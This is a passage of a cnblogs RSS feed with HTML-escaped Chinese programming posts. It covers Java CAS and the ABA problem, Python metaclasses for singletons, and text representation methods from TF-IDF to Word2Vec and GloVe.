&lt;/ul&gt;&lt;ol&gt;&lt;li&gt;&lt;code&gt;线程 1&lt;/code&gt; 通过&lt;code&gt;getIntVolatile(o, offset)&lt;/code&gt;拿到 value 值 A，这时&lt;code&gt;线程 1&lt;/code&gt; 被挂起。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;线程 2&lt;/code&gt; 也通过&lt;code&gt;getIntVolatile(o, offset)&lt;/code&gt;方法获取到 value 值 A，并执行&lt;code&gt;weakCompareAndSetInt&lt;/code&gt;方法比较内存值也为 A，成功修改内存值为 B。&lt;/li&gt;
&lt;li&gt;这时&lt;code&gt;线程 1&lt;/code&gt; 恢复执行&lt;code&gt;weakCompareAndSetInt&lt;/code&gt;方法比较，发现自己手里的值 A 和内存的值 B 不一致，说明该值已经被其它线程提前修改过了。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;线程 1&lt;/code&gt; 重新执行&lt;code&gt;getIntVolatile(o, offset)&lt;/code&gt;再次获取 value 值，因为变量 value 被 volatile 修饰，具有可见性，线程A继续执行&lt;code&gt;weakCompareAndSetInt&lt;/code&gt;进行比较替换，直到成功&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;使用限制&quot;&gt;使用限制&lt;/h2&gt;
&lt;p&gt;CAS是由CPU支持的原子操作，其原子性是在硬件层面进行保证的，在Java中普通用户无法直接使用，只能借助&lt;code&gt;atomic&lt;/code&gt;包下的原子类使用，灵活性受限。&lt;/p&gt;
&lt;p&gt;但是CAS只能保证单个变量操作的原子性，当涉及到多个变量时，CAS无能为力。&lt;/p&gt;
&lt;p&gt;原子性也不一定能保证线程安全，如在Java中需要与&lt;code&gt;volatile&lt;/code&gt;配合来保证线程安全。&lt;/p&gt;
&lt;h2 id=&quot;aba-问题&quot;&gt;ABA 问题&lt;/h2&gt;
&lt;h3 id=&quot;概念&quot;&gt;概念&lt;/h3&gt;
&lt;p&gt;CAS 有一个问题，举例子如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;线程 1&lt;/code&gt; 从内存位置 V 取出 A&lt;/li&gt;
&lt;li&gt;这时候&lt;code&gt;线程 2&lt;/code&gt; 也从内存位置 V 取出 A&lt;/li&gt;
&lt;li&gt;此时&lt;code&gt;线程 1&lt;/code&gt; 处于挂起状态，&lt;code&gt;线程 2&lt;/code&gt; 将位置 V 的值改成 B，最后再改成 A&lt;/li&gt;
&lt;li&gt;这时候&lt;code&gt;线程 1&lt;/code&gt; 再执行，发现位置 V 的值没有变化，符合期望继续执行。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;此时虽然&lt;code&gt;线程 1&lt;/code&gt;还是成功了，但是这并不符合我们真实的期望，等于&lt;code&gt;线程 2&lt;/code&gt;&lt;strong&gt;狸猫换太子&lt;/strong&gt;把&lt;code&gt;线程 1&lt;/code&gt;耍了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这就是所谓的ABA问题&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;解决方案&quot;&gt;解决方案&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;引入原子引用，带版本号的原子操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;把我们的每一次操作都带上一个版本号，这样就可以避免ABA问题的发生。既乐观锁的思想。&lt;/p&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;内存中的值每发生一次变化，版本号都更新。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;在进行CAS操作时，比较内存中的值的同时，也会比较版本号，只有当二者都没有变化时，才能执行成功。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;Java中的&lt;code&gt;AtomicStampedReference&lt;/code&gt;类便是使用版本号来解决ABA问题的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;高竞争下的开销问题&quot;&gt;高竞争下的开销问题&lt;/h2&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;在并发冲突概率大的高竞争环境下，如果CAS一直失败，会一直重试，CPU开销较大。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;针对这个问题的一个思路是引入退出机制，如重试次数超过一定阈值后失败退出。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;更重要的是避免在高竞争环境下使用乐观锁。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;</description>
<pubDate>Mon, 18 Jan 2021 17:18:00 +0000</pubDate>
<dc:creator>阿墩</dc:creator>
<og:description>什么是CAS CAS 即 compare and swap，比较并交换。 CAS是一种原子操作，同时 CAS 使用乐观锁机制。 J.U.C中的很多功能都是建立在 CAS 之上，各种原子类，其底层都用</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/aduner/p/14296008.html</dc:identifier>
</item>
<item>
<title>Python 元类 - Yabea</title>
<link>http://www.cnblogs.com/ybjourney/p/14295872.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/ybjourney/p/14295872.html</guid>
<description>&lt;p&gt;印象中，是在创建单例模式时知道可以用到元类（metaclass），但始终对其了解的不是很透彻，很多人也都说元类是Python中较难理解的概念之一，于是找来几本书，希望可以找到答案，本文以Python3为例。&lt;/p&gt;
&lt;p&gt;本文参考：&lt;/p&gt;
&lt;p&gt;《人人都懂设计模式》&lt;/p&gt;
&lt;p&gt;《Python Cookbook》&lt;/p&gt;
&lt;p&gt;《 流畅的Python》&lt;/p&gt;
&lt;p&gt;先来简单介绍下：元类（metaclass）是一个类，你也可以理解为类的类，因为Python中的类是在运行时动态创建的，那么通过元类便可以控制类属性和类实例的创建过程。&lt;/p&gt;
&lt;p&gt;来看看用元类实现的单例模式：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;class Singleton(type):
    &quot;&quot;&quot;
    单例模式
    &quot;&quot;&quot;
    def __init__(cls, *args, **kwargs):
        cls.__instance = None
        super().__init__(*args, **kwargs)

    def __call__(cls, *args, **kwargs):
        if cls.__instance is None:
            cls.__instance = super().__call__(*args, **kwargs)
        return cls.__instance


class Test(metaclass=Singleton):

    def __init__(self):
        pass


a = Test()
b = Test()
print(id(a))
print(id(b))
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;具体的实现是：创建类时显式的指定类的metaclass，而自定义的metaclass继承type，并重新实现&lt;code&gt;__call__&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;于是，有了两个问题：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;为什么自定义的metaclass继承type？&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;因为，在Python中，type是默认的metaclass（内建元类），Python允许我们自定义metaclass，自定义的metaclass必须继承自type，也就是：元类从type类继承了构建类的能力。&lt;/p&gt;
&lt;p&gt;我们通常用type来获取对象所属的类，就像这样：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;In [10]: a = 10

In [11]: type(a)
Out[11]: int
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然而，type还是一个类，你可以通过type来新建一个类，看type的源码，通过&lt;code&gt;type(name, bases, dict)&lt;/code&gt;便可以生成一个新的类：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;In [44]: test_class = type('Test', (), dict({'name': None}))

In [45]: a = test_class()

In [46]: a.name = 'Tony'

In [47]: a.name
Out[47]: 'Tony'
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;默认情况下，Python中类都是type类的实例:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;In [12]: class A:
    ...:     pass
    ...:

In [13]: A.__class__
Out[13]: type

In [14]: int.__class__
Out[14]: type
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当你使用class关键字时，Python在幕后做的事情，就是通过元类来实现的。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;为什么重新定义&lt;code&gt;__call__&lt;/code&gt;方法？&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;提出该问题是因为，与Python类创建相关的方法是：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__new__&lt;/code&gt;：类方法，负责对象的创建，在定义类时需要返回一个实例，在我们通过类名进行实例化对象时自动调用。&lt;br/&gt;&lt;code&gt;__init__&lt;/code&gt;：初始化函数，负责对new实例化的对象进行初始化，负责对象状态的更新和属性的设置，在每一次实例化对象之后调用。&lt;/p&gt;
&lt;p&gt;而我们常用&lt;code&gt;__call__&lt;/code&gt;方法只是为了声明这个类的对象是可调用的（callable）。&lt;/p&gt;
&lt;p&gt;但是，在metaclass中&lt;code&gt;__call__&lt;/code&gt;方法还负责对象的创建，这就是为什么要重新定义的原因了。&lt;/p&gt;
&lt;p&gt;重定义了&lt;code&gt;__call__&lt;/code&gt;方法之后，一个对象的创建过程大概如下图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/771535/202101/771535-20210118235159548-1978502400.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们验证一下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-Python&quot;&gt;class TestMetaClass(type):

    def __init__(cls, what, bases=None, dict=None):
        print(&quot;metaclass init&quot;)
        super().__init__(what, bases, dict)

    def __call__(cls, *args, **kwargs):
        print(&quot;metaclass call&quot;)
        self = super(TestMetaClass, cls).__call__(*args, **kwargs)
        return self


class TestClass(metaclass=TestMetaClass):

    def __init__(self, *args, **kwargs):
        print(&quot;class init&quot;)
        super().__init__()

    def __new__(cls, *args, **kwargs):
        print(&quot;class new&quot;)
        self = super().__new__(cls)
        return self

a = TestClass()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;返回：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;metaclass init
metaclass call
class new
class init
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，&lt;code&gt;__call__&lt;/code&gt;方法在类执行&lt;code&gt;__new__&lt;/code&gt;和&lt;code&gt;__init__&lt;/code&gt;之前执行，这样就可以解释：&lt;/p&gt;
&lt;p&gt;在Singleton中的&lt;code&gt;__call__&lt;/code&gt;方法对类属性&lt;code&gt;__instance&lt;/code&gt;进行判断：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;如果&lt;code&gt;__instance&lt;/code&gt;为None，表明类还未进行实例化，那么给&lt;code&gt;__instance&lt;/code&gt;赋值为元类的父类（type）的&lt;code&gt;__call__&lt;/code&gt;方法。&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;__instance&lt;/code&gt;不为None，说明类已经进行过实例化，直接返回cls.__instance中的类实例。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;便实现了单例模式。&lt;/p&gt;
&lt;p&gt;除了重新定义&lt;code&gt;__call__&lt;/code&gt;以外，元类可以通过实现&lt;code&gt;__init__&lt;/code&gt;方法来定制实例，元类的&lt;code&gt;__init__&lt;/code&gt;方法可以做到类装饰器能做到的任务事情，并且作用更大。&lt;/p&gt;
&lt;p&gt;如果想要进一步定制类，可以在元类中实现&lt;code&gt;__new__&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;另，编写元类时，通常会把self参数改为cls，这样能更清楚的表明要构建的实例是类。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;元类的调用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;上述例子中，都是通过&lt;code&gt;metaclass=''&lt;/code&gt;来设置类的元类，还可以这样：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;class TestClass():
    __metaclass__ = TestMetaClass

    def __init__(self, *args, **kwargs):
        print(&quot;class init&quot;)
        super().__init__()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在执行类定义时，解释器会先寻找这个类属性中的&lt;code&gt;__metaclass__&lt;/code&gt;，如果此属性存在，就将这个属性赋值给此类作为它的元类，如果此属性没有定义的话，就会向上查找父类的&lt;code&gt;__metaclass__&lt;/code&gt;，如果没有发现任何的父类，并且解释器中也没有名字为&lt;code&gt;__metaclass__&lt;/code&gt;的全局变量，这个类就是传统类，会使用type.ClassType作为此类的元类。&lt;/p&gt;
&lt;p&gt;以上。&lt;/p&gt;
</description>
<pubDate>Mon, 18 Jan 2021 15:53:00 +0000</pubDate>
<dc:creator>Yabea</dc:creator>
<og:description>本文通过Python实现单例模式一步步理解元类。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/ybjourney/p/14295872.html</dc:identifier>
</item>
<item>
<title>文本表示 - 知亦行</title>
<link>http://www.cnblogs.com/wonker/p/14295824.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wonker/p/14295824.html</guid>
<description>&lt;p&gt;将文本数据表示成计算机能够运算的数字或向量&lt;/p&gt;
&lt;h2 id=&quot;离散表示&quot;&gt;离散表示&lt;/h2&gt;
&lt;h2 id=&quot;独热编码（one-hot）&quot;&gt;独热编码（One-hot）&lt;/h2&gt;
&lt;h2 id=&quot;词袋模型bag-of-words&quot;&gt;词袋模型(Bag of Words)&lt;/h2&gt;
&lt;ul readability=&quot;12.5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;思想：&lt;/p&gt;
&lt;p&gt;把每篇文章看成一袋子词，并忽略每个词出现的顺序。具体来看：将整段文本表示成一个长向量，每一维代表一个单词。该维对应的权重代表这个词在原文章中的重要程度。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;24&quot;&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;p&gt;句1：Jane wants to go to Shenzhen. 句2：Bob wants to go to Shanghai.&lt;/p&gt;
&lt;p&gt;使用两个例句构造词袋： [Jane, wants, to, go, Shenzhen, Bob, Shanghai]&lt;/p&gt;
&lt;p&gt;两个例句就可以用以下两个向量表示，对应的下标与映射数组的下标相匹配，其值为该词语出现的次数&lt;/p&gt;
&lt;p&gt;句1：[1,1,2,1,1,0,0] 句2：[0,1,2,1,0,1,1]&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;词频-逆向文件频率（tf-idf）&quot;&gt;词频-逆向文件频率（TF-IDF）&lt;/h2&gt;
&lt;ul readability=&quot;5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;思想：&lt;/p&gt;
&lt;p&gt;字词的重要性随着它在文件中出现的次数成正比增加，但同时会随着它在语料库中出现的频率成反比下降。如果某个单词在一篇文章中出现的频率TF高，并且在其他文章中很少出现，则认为此词或者短语具有很好的类别区分能力，适合用来分类。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;公式：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span class=&quot;math inline&quot;&gt;\(TF-IDF(t,d)=TF(t,d) × IDF(t)\)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;math inline&quot;&gt;\(IDF(t)=log\frac {文章总数} {包含单词t的文章总数+1}\)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&quot;math inline&quot;&gt;\(TF=\frac{单词t在文档中出现的次数}{该文档的总词量}\)&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;8&quot;&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;p&gt;（1）没有考虑特征词的位置因素对文本的区分度，词条出现在文档的不同位置时，对区分度的贡献大小是不一样的。&lt;/p&gt;
&lt;p&gt;（2）按照传统TF-IDF，往往一些生僻词的IDF(反文档频率)会比较高、因此这些生僻词常会被误认为是文档关键词。&lt;/p&gt;
&lt;p&gt;（3）IDF部分只考虑了特征词与它出现的文本数之间的关系，而忽略了特征项在一个类别中不同的类别间的分布情况。&lt;/p&gt;
&lt;p&gt;（4）对于文档中出现次数较少的重要人名、地名信息提取效果不佳。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;# 参数为 CounterVectorizer 和 TfidfTransformer 的所有参数
tfidf=TfidfVectorizer(tokenizer=jieba.lcut,stop_words=stopwords,norm='l2',use_idf=True,smooth_idf=True,sublinear_tf=False)
res=tfidf.fit_transform(contents)#直接对文档进行转换提取tfidf特征
res.toarray()#一步就得到了tfidf向量思想：
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;n-gram模型（统计语言模型）&quot;&gt;N-Gram模型（统计语言模型）&lt;/h2&gt;
&lt;ul readability=&quot;16&quot;&gt;&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;统计语言模型：&lt;/p&gt;
&lt;p&gt;是一个基于概率的判别模型。统计语言模型把语言（词的序列）看作一个随机事件，并赋予相应的概率来描述其属于某种语言集合的可能性。给定一个词汇集合 V，对于一个由 V 中的词构成的序列S = ⟨w1, · · · , wT ⟩ ∈ Vn，统计语言模型赋予这个序列一个概率P(S)，来衡量S 符合自然语言的语法和语义规则的置信度。用一句简单的话说，统计语言模型就是计算一个句子的概率大小的这种模型。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;思想：&lt;/p&gt;
&lt;p&gt;N-Gram是一种基于统计语言模型的算法。它的基本思想是将文本里面的内容按照字节进行大小为N的滑动窗口操作，形成了长度是N的字节片段序列。每一个字节片段称为gram，对所有gram的出现频度进行统计，并且按照事先设定好的阈值进行过滤，形成关键gram列表，也就是这个文本的向量特征空间，列表中的每一种gram就是一个特征向量维度。把这些生成一个字典，按照词袋模型的方式进行编码得到结果。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;23&quot;&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;John likes to watch movies. Mary likes too
John also likes to watch football games.
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;构造字典：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;{&quot;John likes”: 1, &quot;likes to”: 2, &quot;to watch”: 3, &quot;watch movies”: 4, &quot;Mary likes”: 5, &quot;likes too”: 6, &quot;John also”: 7, &quot;also likes”: 8, “watch football”: 9, &quot;football games&quot;: 10}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此时，第一句的向量表示为：&lt;strong&gt;[1, 1, 1, 1, 1, 1, 0, 0, 0, 0]&lt;/strong&gt;，其中第一个1表示&lt;strong&gt;John likes&lt;/strong&gt;在该句中出现了1次，依次类推。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;离散表示的问题&quot;&gt;离散表示的问题&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;无法衡量词向量之间的关系。&lt;/li&gt;
&lt;li&gt;词表的维度随着语料库的增长而膨胀。&lt;/li&gt;
&lt;li&gt;n-gram词序列随语料库增长呈指数型膨胀，更加快。&lt;/li&gt;
&lt;li&gt;离散数据来表示文本会带来数据稀疏问题，导致丢失了信息，与我们生活中理解的信息是不一样的。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;分布式表示&quot;&gt;分布式表示&lt;/h2&gt;
&lt;p&gt;主要思想是&lt;strong&gt;用周围的词表示该词&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;共现矩阵cocurrence-matrix&quot;&gt;共现矩阵(Cocurrence matrix)&lt;/h2&gt;
&lt;ul readability=&quot;-0.5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;思想：&lt;/p&gt;
&lt;p&gt;“共现”，即共同出现，如一句话中共同出现，或一篇文章中共同出现。这里给共同出现的距离一个规范——窗口，如果窗口宽度是2，那就是在当前词的前后各2个词的范围内共同出现。可以想象，其实是一个总长为5的窗口依次扫过所有文本，同时出现在其中的词就说它们共现。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;例子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.wonkers.cn//image-20210117155944299.png&quot; alt=&quot;image-20210117155944299&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;神经网络语言模型（nnlm）&quot;&gt;神经网络语言模型（NNLM）&lt;/h2&gt;
&lt;ul readability=&quot;1.5&quot;&gt;&lt;li&gt;
&lt;p&gt;思想：&lt;/p&gt;
&lt;ul readability=&quot;3&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;NNLM是从语言模型出发(即计算概率角度)，构建神经网络针对目标函数对模型进行最优化，训练的起点是使用神经网络去搭建语言模型实现词的预测任务，并且在优化过程后模型的副产品就是词向量。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;进行神经网络模型的训练时，目标是进行词的概率预测，就是在词环境下，预测下一个该是什么词，目标函数如下式, 通过对网络训练一定程度后，最后的模型参数就可当成词向量使用。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;最后关心的并不是输出层的预测概率，而是通过BP+SGD得到的中间产物：最优投影矩阵C，将其作为文本表示矩阵。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;3&quot;&gt;
&lt;p&gt;概率函数：&lt;span class=&quot;math inline&quot;&gt;\(f(w_{t},w_{t-1},...,w_{t-n+2}, w_{t-n+1})=p(w_{t} | {w_{1}}^{t-1})\)&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目标函数：&lt;img src=&quot;http://image.wonkers.cn//5012681-dfd2deb8955da0cb.png&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;约束条件：&lt;img src=&quot;http://image.wonkers.cn//image-20210118145038303.png&quot; alt=&quot;image-20210118145038303&quot; loading=&quot;lazy&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;训练过程就是学习θ的最大似然, 其中R(θ) 是正则项。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;模型结构：&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;http://image.wonkers.cn//945696-20170901170825312-1330533346.png&quot; alt=&quot;img&quot;/&gt;&lt;p&gt;&lt;img src=&quot;http://image.wonkers.cn//v2-35870dc7d2e97e2844f9c3aad72a5fb0_720w.jpg&quot; alt=&quot;img&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://image.wonkers.cn//image-20210118145332072.png&quot; alt=&quot;image-20210118145332072&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;直连矩阵W可以加快模型训练速度，但对效果提升不大。直连可以合并词向量不经过隐含层，直接右乘直连矩阵 W 得到 &lt;span class=&quot;math inline&quot;&gt;\(v \times 1\)&lt;/span&gt; 维输出后与前述的 &lt;span class=&quot;math inline&quot;&gt;\(v \times 1\)&lt;/span&gt; 维输出向相加，得到一个最终的 &lt;span class=&quot;math inline&quot;&gt;\(v \times 1\)&lt;/span&gt; 维输出向量。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;模型训练&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://image.wonkers.cn//image-20210118145411203.png&quot; alt=&quot;image-20210118145411203&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;流程梳理&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://image.wonkers.cn//image-20210118150555438.png&quot; alt=&quot;image-20210118150555438&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;word2vec&quot;&gt;Word2Vec&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;
&lt;p&gt;CBOW&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;获得中间词两边的的上下文，然后用周围的词去预测中间的词，把中间词当做y，把窗口中的其它词当做x输入，x输入是经过one-hot编码过的，然后通过一个隐层进行求和操作，最后通过激活函数softmax，可以计算出每个单词的生成概率，接下来的任务就是训练神经网络的权重，使得语料库中所有单词的整体生成概率最大化，而求得的权重矩阵就是文本表示词向量的结果。&lt;/li&gt;
&lt;li&gt;与NNLM的联系：
&lt;ul&gt;&lt;li&gt;移除前向反馈神经网络中非线性的hidden layer，直接将中间层的Embedding layer与输出层的softmax layer连接；&lt;/li&gt;
&lt;li&gt;忽略上下文环境的序列信息：输入的所有词向量均汇总到同一个Embedding layer；&lt;/li&gt;
&lt;li&gt;将Future words纳入上下文环境&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;模型结构&lt;/li&gt;
&lt;/ul&gt;&lt;img src=&quot;http://image.wonkers.cn//2020-2-19_17-29-38.png&quot; alt=&quot;img&quot;/&gt;&lt;ul&gt;&lt;li&gt;流程梳理&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://image.wonkers.cn//image-20210118164239883.png&quot; alt=&quot;image-20210118164239883&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Skip-Gram&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;通过当前词来预测窗口中上下文词出现的概率模型，把当前词当做x，把窗口中其它词当做y，依然是通过一个隐层接一个Softmax激活函数来预测其它词的概率。&lt;/li&gt;
&lt;li&gt;Skip-gram模型的本质是&lt;strong&gt;计算输入word的input vector与目标word的output vector之间的余弦相似度，并进行softmax归一化&lt;/strong&gt;。我们要学习的模型参数正是这两类词向量。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;优化tricks&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;glove&quot;&gt;Glove&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;GloVe的全称叫Global Vectors for Word Representation，它是一个基于全局词频统计（count-based &amp;amp; overall statistics）的词表征（word representation）工具，它可以把一个单词表达成一个由实数组成的向量，这些向量捕捉到了单词之间一些语义特性，比如相似性（similarity）、类比性（analogy）等。&lt;/strong&gt;我们通过对向量的运算，比如欧几里得距离或者cosine相似度，可以计算出两个单词之间的语义相似性。&lt;/p&gt;
&lt;p&gt;实现步骤&lt;/p&gt;
&lt;ul readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;构建共现矩阵&lt;/p&gt;
&lt;p&gt;根据语料库（corpus）构建一个共现矩阵（Co-ocurrence Matrix）X，&lt;strong&gt;矩阵中的每一个元素 Xij 代表单词 i 和上下文单词 j 在特定大小的上下文窗口（context window）内共同出现的次数。&lt;/strong&gt;一般而言，这个次数的最小单位是1，但是GloVe不这么认为：它根据两个单词在上下文窗口的距离 d，提出了一个衰减函数（decreasing weighting）：decay=1/d 用于计算权重，也就是说&lt;strong&gt;距离越远的两个单词所占总计数（total count）的权重越小&lt;/strong&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;构建词向量和共现矩阵之间的近似关系&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span class=&quot;math inline&quot;&gt;\(w_{i}^{T}\tilde{w_{j}} + b_i + \tilde{b_j} = \log(X_{ij}) \tag{1}\)&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;其中，&lt;span class=&quot;math inline&quot;&gt;\(w_{i}^{T}\)&lt;/span&gt;和&lt;span class=&quot;math inline&quot;&gt;\(\tilde{w_{j}}\)&lt;/span&gt;是我们最终要求解的词向量；&lt;span class=&quot;math inline&quot;&gt;\(b_i\)&lt;/span&gt;和&lt;span class=&quot;math inline&quot;&gt;\(\tilde b_j\)&lt;/span&gt;分别是两个词向量的bias term。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;构建损失函数&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math inline&quot;&gt;\(J = \sum_{i,j=1}^{V} f(X_{ij})(w_{i}^{T}\tilde{w_{j}} + b_i + \tilde{b_j} – \log(X_{ij}) )^2 \tag{2}\)&lt;/span&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://image.wonkers.cn//image-20210118190523016.png&quot; alt=&quot;image-20210118190523016&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;流程梳理&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;http://image.wonkers.cn//image-20210118190638818.png&quot; alt=&quot;image-20210118190638818&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;Glove与LSA、word2vec的比较&lt;/p&gt;
